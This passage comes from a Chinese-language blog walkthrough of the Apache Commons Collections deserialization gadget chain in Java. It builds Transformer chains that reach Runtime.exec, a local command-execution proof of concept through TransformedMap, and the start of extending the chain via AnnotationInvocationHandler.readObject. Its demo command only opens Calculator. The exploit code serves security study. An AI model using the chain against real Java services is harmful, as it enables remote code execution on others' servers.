<strong>this.iTransformers</strong> 数组中 , 从而获得一条完整的调用链 .</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//反射调用getMethod方法,然后getMethod方法再反射调用getRuntime方法, 返回Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app &quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    那么如何获取 java.lang.Runtime 实例对象 , 来开启这个调用链呢 ?</p><h3 id="org-apache-commons-collections-functors-ConstantTransformer-class"><a href="#org-apache-commons-collections-functors-ConstantTransformer-class" class="headerlink" title="org/apache/commons/collections/functors/ConstantTransformer.class"></a><strong>org/apache/commons/collections/functors/ConstantTransformer.class</strong></h3><ol><li>目前的问题是如何获取 <strong>Runtime</strong> 实例对象 . 而 <strong>ConstantTransformer.transform()</strong> 方法满足我们的需求 .</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-091720.png"                      alt="image-20230418171720036"                ></p><p>​    <strong>ConstantTransformer.transform()</strong> 方法恰好会返回 <strong>Runtime()</strong> 实例对象 , 因此我们只需要将 <strong>Runtime.class</strong> 传入 <strong>ConstantTransformer</strong> 的构造方法中即可 .</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//传入Runtime类</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//反射调用getMethod方法,然后getMethod方法再反射调用getRuntime方法, 返回Runtime.getRuntime()方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app &quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​    至此 , <strong>transform( )</strong> 方法的参数限制已经被去除 , 此时无论 <strong>transform( )</strong> 方法的参数是什么 , 都会执行 <strong>java.lang.Runtime.getRuntime( ).exec( )</strong> 调用链 , 实现命令执行.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalObject_1</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法,然后getMethod方法再反射调用getRuntime方法, 返回Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app &quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        transformerChain.transform(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>详细分析</strong></p><p>​    这个地方可能要注意，第一个InvokerTransformer反射调用的是getMethod方法，而不是getRuntime方法, 是通过反射调用的getMethod方法，再次反射调用getRuntime方法，才返回的Runtime.getRuntime( )方法：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-162607.png"                      alt="image-20230419002607571"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-163526.png"                      alt="image-20230419003526227"                ></p><p>​    此时可以看见传入的是java.lang.Runtime</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-163712.png"                      alt="image-20230419003712051"                ></p><p>​    进入transform</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-164749.png"                      alt="image-20230419004748540"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-164913.png"                      alt="image-20230419004912612"                ></p><p>​    我们看到获取到的实际是</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-165309.png"                      alt="image-20230419005308562"                ></p><p>​    那么这句返回的其实是<strong>java.lang.reflect.Method的对象.invoke( java.lang.Runtime , getRuntime)</strong></p><p>​    这儿返回的是Java.lang.Runtime.getRuntime( )了</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-18-171910.png"                      alt="image-20230419011909432"                ></p><h2 id="Transform-方法的利用条件"><a href="#Transform-方法的利用条件" class="headerlink" title="Transform()方法的利用条件"></a>Transform()方法的利用条件</h2><p>​    上一步 , 我们通过 java 反射机制消除了 <strong>transform()</strong> 方法的参数限制 . 但是依旧需要手动触发 <strong>transform()</strong> 方法 , 这样的场景是比较少的 .</p><p>​    根据 Java 反序列化漏洞的定义 , 我们更加期望后端程序在执行 <strong>readObject()</strong> 方法时就会自动执行 <strong>transform() 方法</strong>.</p><p>​    综上所述 , 为了实现完整的利用链 , 必须要达成如下两个目标 :</p><ul><li>找到一个 tansform() 方法 , 该方法所属的实例对象是可控的.</li><li>找到一个重写的 readObject() 方法 , 该方法会自动调用 transform() 方法.</li></ul><p>​    这个限制是非常严谨的 , 目前研究人员共发掘出了两条攻击链 , 也就是经典的 <strong>TransformedMap攻击链</strong> 和 <strong>LazyMap攻击链</strong></p><h2 id="TransformedMap攻击链"><a href="#TransformedMap攻击链" class="headerlink" title="TransformedMap攻击链"></a>TransformedMap攻击链</h2><p>​    Apache Commons Collections 实现了一个 TransformedMap 类，该类是对 Java 标准数据结构 Map 接口的一个扩展 .</p><p>​    该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换 , 具体的变换逻辑由Transformer 类定义，Transformer 在 TransformedMap 实例化时作为参数传入.</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-022917.png"                      alt="image-20230419102917243"                ></p><h3 id="TransformedMap-checkSetValue"><a href="#TransformedMap-checkSetValue" class="headerlink" title="TransformedMap.checkSetValue()"></a><strong>TransformedMap.checkSetValue()</strong></h3><p>​    <strong>TransformedMap</strong> 类的 <strong>checkSetValue()</strong> 方法中调用了 <strong>Transform()</strong> 方法 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-023534.png"                      alt="image-20230419103533746"                ></p><p>​    只要我们能控制 <strong>this.valueTransformer</strong> , 那么就可以利用该方法执行 <strong>ChainedTransformer.transform()</strong> 方法 , 进入构造好的函数调用链 . 根据上文可以得知 , <strong>this.valueTransformer</strong> 会在 <strong>TransformedMap</strong> 类被实例化时被传入 .</p><p>​    由于 <strong>TransformedMap</strong> 类的构造方法通过 <strong>protected</strong> 修饰符修饰 , 所以无法在外界获得 <strong>TransformedMap</strong> 实例对象 . 对此 , 该类提供了 <strong>decorate()</strong> 方法来返回 <strong>TransformedMap</strong> 实例对象 , 而 <strong>decorate()</strong> 方法通过 <strong>public</strong> 修饰符修饰 , 外界可以直接调用 .</p><p>​    综上所述 , <strong>this.valueTransformer</strong> 是完全可控的 . 我们可以通过这里调用 <strong>ChainedTransformer.transform()</strong> 方法</p><h3 id="TransformedMap-decorate"><a href="#TransformedMap-decorate" class="headerlink" title="TransformedMap.decorate()"></a><strong>TransformedMap.decorate()</strong></h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-025851.png"                      alt="image-20230419105850687"                ></p><p>​    Map : 需要转换的 Map 对象</p><p>​    KeyTransformer : 用于转换键的转换器 , 如果为 null 则表示不进行转换</p><p>​    ValueTransformer : 用于转换值的转换器 , 如果为 null 则表示不进行转换</p><p>​    <strong>既然要调用 TransformedMap.decorate() 方法 , 那么这里 ValueTransformer 就应为 ChainedTransformer . 此外 , 我们还需要一个 Map类型的变量 , 而获取 Map 最简单的方式就是构造一个 HashMap , 然后将该 Map 实例对象传入 decorate() 方法中.</strong></p><p>​    因此 , 我们需要构造如下代码 :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建Map并绑定transformerChain</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//初始化HashMap</span></span><br><span class="line">innerMap.put(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//调用decorate()方法</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,transformerChain);</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-030428.png"                      alt="image-20230419110427673"                ></p><p>​    那么现在还剩一个问题 : 如何调用 checkSetValue() 方法呢? 要知道该方法同样通过 protected 修饰符修饰 , 外界是无法直接调用的 .</p><h3 id="AbstractInputCheckedMapDecorator-MapEntry-setValue"><a href="#AbstractInputCheckedMapDecorator-MapEntry-setValue" class="headerlink" title="AbstractInputCheckedMapDecorator$MapEntry.setValue()"></a><strong>AbstractInputCheckedMapDecorator$MapEntry.setValue()</strong></h3><p>​    transformedMap 的父类 AbstractInputCheckedMapDecorator 中存在一个静态内部类 MapEntry , 该类 setValue() 中调用了 checkSetValue() 方法.    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-145957.png"                      alt="image-20230419225956866"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-150109.png"                      alt="image-20230419230108770"                ></p><p>​    我们现在的目标是调用 <strong>TransformedMap.checkSetValue()</strong> 方法 , 因此只需要令 <strong>this.parent</strong> 指向 <strong>TransformedMap</strong> 实例对象即可 . 查看 <strong>MapEntry</strong> 内部类的构造函数 , 可以确定 <strong>this.parent</strong> 参数值是作为参数传入的 . 是可控的 .</p><h3 id="AbstractInputCheckedMapDecorator-EntrySetIterator-next"><a href="#AbstractInputCheckedMapDecorator-EntrySetIterator-next" class="headerlink" title="AbstractInputCheckedMapDecorator$EntrySetIterator.next()"></a><strong>AbstractInputCheckedMapDecorator$EntrySetIterator.next()</strong></h3><p>​    我们对 <strong>this.parent = parent</strong> 打断点 , 查看 <strong>parent</strong> 参数值的函数调用栈 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-151421.png"                      alt="image-20230419231420887"                ></p><p>​    可以看到 , <strong>AbstractInputCheckedMapDecorator</strong> 类的静态内部类 <strong>EntrySetIterator</strong> 中的 <strong>next()</strong> 方法触发了 <strong>MapEntry</strong> 内部类的构造函数 , 并传入 <strong>parent</strong> 参数值 . 最后返回 <strong>AbstractInputCheckedMapDecorator$MapEntry</strong> 实例对象 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-152428.png"                      alt="image-20230419232428220"                ></p><h3 id="AbstractInputCheckedMapDecorator-EntrySet-iterator"><a href="#AbstractInputCheckedMapDecorator-EntrySet-iterator" class="headerlink" title="AbstractInputCheckedMapDecorator$EntrySet.iterator()"></a><strong>AbstractInputCheckedMapDecorator$EntrySet.iterator()</strong></h3><p>​    这里 <strong>this.parent</strong> 参数依旧是可控的 ,我们继续跟踪 <strong>this.parent = parent</strong> ,</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-153005.png"                      alt="image-20230419233004835"                ></p><p>​    可以看到 , <strong>AbstractInputCheckedMapDecorator</strong> 类的静态内部类 <strong>EntrySet</strong> 中的 <strong>iterator()</strong> 方法触发了 <strong>EntrySetIterator</strong> 内部类的构造函数 , 并且传入 <strong>parent</strong> 参数. 最后返回 <strong>AbstractInputCheckedMapDecorator$EntrySetIterator</strong> 实例对象.</p><h3 id="AbstractInputCheckedMapDecorator-entrySet"><a href="#AbstractInputCheckedMapDecorator-entrySet" class="headerlink" title="AbstractInputCheckedMapDecorator.entrySet()"></a><strong>AbstractInputCheckedMapDecorator.entrySet()</strong></h3><p>​    依旧没看到 <strong>this.parent</strong> 的控制点 , 我们继续追踪 <strong>this.parent = parent</strong> .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-153449.png"                      alt="image-20230419233448685"                ></p><p>​    这里会根据 <strong>isSetValueChecking()</strong> 方法的返回值决定是否调用 <strong>AbstractInputCheckedMapDecorator.EntrySet()</strong> 方法 .</p><p>​    而抽象类 <strong>AbstractInputCheckedMapDecorator</strong> 恰好是 <strong>TransformedMap</strong> 的父类 , 因此这里我们可以直接将 <strong>this</strong> 指向 <strong>TransformedMap</strong> . 使得最后调用 <strong>TransformedMap.checkSetValue()</strong> 方法 .</p><h3 id="TransformedMap-isSetValueChecking"><a href="#TransformedMap-isSetValueChecking" class="headerlink" title="TransformedMap.isSetValueChecking()"></a><strong>TransformedMap.isSetValueChecking()</strong></h3><p>​    那么现在还剩最后一个问题 : 我们需要让 isSetValueChecking() 方法的返回值为 True</p><p>​    <strong>TransformedMap</strong> 实现了抽象父类的 <strong>isSetValueChecking( )</strong> 方法 , 来看一下函数定义</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-154522.png"                      alt="image-20230419234522353"                ></p><p>​    只需要让 <strong>this.valueTransformer</strong> 不会空即可 ! 这当然是成立的 , 我们在将 <strong>TransfromedMap.decorate()</strong> 方法时已经将 ChainedTransformer 赋值给了 <strong>this.valueTransformer</strong></p><h2 id="本地命令执行POC"><a href="#本地命令执行POC" class="headerlink" title="本地命令执行POC"></a>本地命令执行POC</h2><p>​    我们上面所有提到的方法调用构成了一个闭环 , 我们只需要获取 <strong>AbstractInputCheckedMapDecorator$MapEntry</strong> 实例对象并手动触发 setValue() 方法 , 就可以执行任意代码 .</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法,然后getMethod方法再反射调用getRuntime方法, 返回Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app &quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChain</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">onlyElement</span> <span class="operator">=</span> (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用到一些逆推的思想 , 说明了函数调用链是如何构造的 . 至此 ,  POC 就构造完毕了 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-160047.png"                      alt="image-20230420000047488"                ></p><h2 id="延长攻击链"><a href="#延长攻击链" class="headerlink" title="延长攻击链"></a>延长攻击链</h2><h3 id="annotation-AnnotationInvocationHandler-readObject"><a href="#annotation-AnnotationInvocationHandler-readObject" class="headerlink" title="annotation/AnnotationInvocationHandler.readObject()"></a><strong>annotation/AnnotationInvocationHandler.readObject()</strong></h3><p>​    这个 POC 是不完善的，因为这个 POC 压根没法投入使用 ! 我们最终的目标是让上文构造的恶意类在远程服务器上执行 , 也就是让恶意类经过序列化/反序列化后直接执行 .</p><p>​    我们的目标是找到一个重写 readObject() 方法的地方 . 该方法中会调用可控的 setValue() 方法 . 那么是否存在这样的地方呢 ? 在 Jdk1.7 中 , <strong>annotation/AnnotationInvocationHandler</strong> 类的 <strong>readObject()</strong> 方法实现了我们的需求 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-19-161933.png"                      alt="image-20230420001932581"                ></p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>​    要想调用 <strong>AbstractInputCheckedMapDecorator$MapEntry.setValue()</strong> 方法 , 第一步要达成如下三个条件 .</p><ol><li><p><strong>var5 = AbstractInputCheckedMapDecorator$MapEntry</strong></p></li><li><p><strong>!var7.isInstance(var8)</strong></p></li><li><p><strong>!(var8 instanceof ExceptionProxy) == True</strong></p></li></ol><p>​    <strong>var7</strong> 的值通过 <strong>var3.get(var6)</strong> 返回 , 且不能为空 .</p><p>​    <strong>var6</strong> 和 <strong>var8</strong> 的值比较好看 , 分别通过 <strong>var5.getKey()</strong> 方法和 <strong>var5.getValue()</strong> 方法获取 <strong>var5</strong> 的键名与值.</p><p>​    var5 是 var4.next() 方法返回的 , 根据上文的内容 , 我们希望 var4 为 <strong>AbstractInputCheckedMapDecorator$EntrySetIterator</strong>实例对象.</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>​    从第一步的结果来看 , 我们需要知道 <strong>var3</strong> 和 <strong>var4</strong> 的赋值过程 .</p><p>​    1. <strong>Iterator var4 = this.memberValues.entrySet().iterator()</strong></p><p>​    2. <strong>Map var3 = var2.memberTypes();</strong></p><p>​    <strong>var4</strong> 是 <strong>this.memberValues.entrySet().Iterator()</strong> 方法返回的 , 对比前面的 POC , 我们期望 <strong>this.memberValues</strong> 指向 <strong>TransformedMap</strong> .</p><p>​    <strong>var3</strong> 是 <strong>var2.memberTypes()</strong> 方法返回的 , 我们跟踪该方法 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-20-090501.png"                      alt="image-20230420170500512"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     